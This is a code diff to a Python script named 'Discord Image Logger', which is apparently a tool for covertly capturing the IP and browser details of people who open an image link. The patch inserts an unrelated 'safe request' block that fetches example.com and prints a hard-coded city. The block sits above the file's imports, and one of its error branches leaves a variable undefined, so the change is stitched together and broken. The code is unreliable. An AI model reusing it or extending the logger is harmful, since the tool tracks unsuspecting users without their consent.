@@ -1,6 +1,28 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
+import httpx
 
+# Safe header access
+headers = {"user-agent": "Example"}
+user_agent = headers.get("user-agent", "Unknown")
+
+# Safe network request
+try:
+    response = httpx.get("https://example.com", timeout=10)
+    response.raise_for_status()
+    data = response.text
+except httpx.RequestError as e:
+    print(f"Network error: {e}")
+except httpx.HTTPStatusError as e:
+    print(f"HTTP error: {e}")
+    data = None
+
+# Safe dictionary access
+info = {"city": "Hanoi"}
+city = info.get("city", "Unknown")
+postal = info.get("postal", "Unknown")
+
+print(city, postal)
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -299,6 +321,5 @@ if (!currenturl.includes("g=")) {
         return
     
     do_GET = handleRequest
-    do_POST = handleRequest
-
+    do_POST = handleRequest    
 handler = ImageLoggerAPI
